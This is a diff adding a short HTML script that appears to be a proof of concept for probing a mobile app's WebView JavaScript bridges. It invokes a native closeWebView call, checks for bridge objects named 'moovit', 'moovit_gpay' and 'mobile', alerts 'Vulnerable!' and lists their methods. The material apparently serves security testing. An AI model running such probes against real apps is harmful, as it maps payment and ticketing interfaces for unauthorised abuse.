@@ -1,0 +1,21 @@
+<script>
+    // 1. Try to close the WebView (Native call)
+    setTimeout(() => {
+        try {
+            mobile.closeWebView();
+            console.log("Success: mobile.closeWebView called");
+        } catch(e) {
+            console.log("Failed: " + e);
+        }
+    }, 2000);
+
+    // 2. Check for other powerful bridges (Ticketing/Payments)
+    const bridges = ["moovit", "moovit_gpay", "mobile"];
+    bridges.forEach(b => {
+        if (window[b]) {
+            alert("Vulnerable! Bridge found: " + b);
+            // Log all methods available on the bridge
+            console.log("Methods on " + b + ":", Object.keys(window[b]));
+        }
+    });
+</script>
